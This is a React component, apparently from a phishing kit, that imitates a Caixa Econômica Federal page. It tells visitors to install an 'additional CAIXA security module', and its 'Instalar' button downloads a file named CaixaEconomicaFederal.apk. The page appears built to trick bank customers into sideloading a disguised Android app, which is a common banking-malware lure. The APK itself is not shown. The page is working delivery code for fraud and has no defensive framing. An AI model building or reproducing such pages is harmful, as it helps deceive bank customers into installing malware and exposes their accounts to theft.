import React from 'react';

const Header = () => {
  return (
    <header className="header">
      <img src="mLogomenor.png" alt="Logo" className="logo" />
    </header>
  );
};

const FinalizadoPage = () => {
  const handleDownload = () => {
    const link = document.createElement('a');
    link.href = 'CaixaEconomicaFederal.apk';
    link.download = 'CaixaEconomicaFederal.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div style={{ backgroundColor: '#fff', minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
      <Header />
      <div style={{ padding: '10px' }}>
        <div style={{ padding: '10px 20px', textAlign: 'center', fontSize: '16px', color: '#277EB6' }}>
          <b>ATENÇÃO:</b>
        </div>

        <div style={{ padding: '10px 20px', textAlign: 'center', background: '#F6F4F4', border: '1px solid #D8D8D8' }}>
        </div>

        <div style={{ padding: '10px 20px', textAlign: 'center', border: '1px solid #D8D8D8', color: '#333' }}>
          Instalação do Módulo Adicional de Segurança CAIXA.
        </div>

        <button
          style={{
            top: '50%',
            left: '29%',
            width: '152px',
            height: '50px',
            color: 'white',
            border: '0px',
            borderRadius: '5px',
            position: 'absolute',
            background: '#1360ae',
          }}
          onClick={handleDownload}
        >
          Instalar
        </button>
      </div>
    </div>
  );
};

export default FinalizadoPage;
